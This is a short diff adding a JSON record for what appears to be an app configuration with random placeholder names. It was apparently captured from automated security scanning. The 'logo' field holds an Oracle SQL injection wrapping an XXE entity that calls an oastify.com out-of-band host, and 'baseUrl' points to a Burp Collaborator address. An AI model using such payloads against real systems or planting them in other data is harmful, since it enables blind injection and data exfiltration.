@@ -1,0 +1,17 @@
+{
+	"baseUrl":"http://burpcollaborator.net/zgjZCdeP",
+	"createdTime":1741334872250,
+	"deleted":false,
+	"description":"qvaqcL",
+	"enabled":false,
+	"id":"67caa958b8a3852f709fe56e",
+	"lastModifiedBy":22743,
+	"lcName":"hsudcq",
+	"logo":"(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % vkihi SYSTEM \"http://mpfts0utqw5mi4fn1lunc8y40v6oufl3orge92y.oasti'||'fy.com/\">%vkihi;]>'),'/l') from dual)",
+	"modifiedTime":1741334872250,
+	"name":"hsuDcq",
+	"ownerUserId":22743,
+	"standard":false,
+	"standardApp":false,
+	"version":0
+}
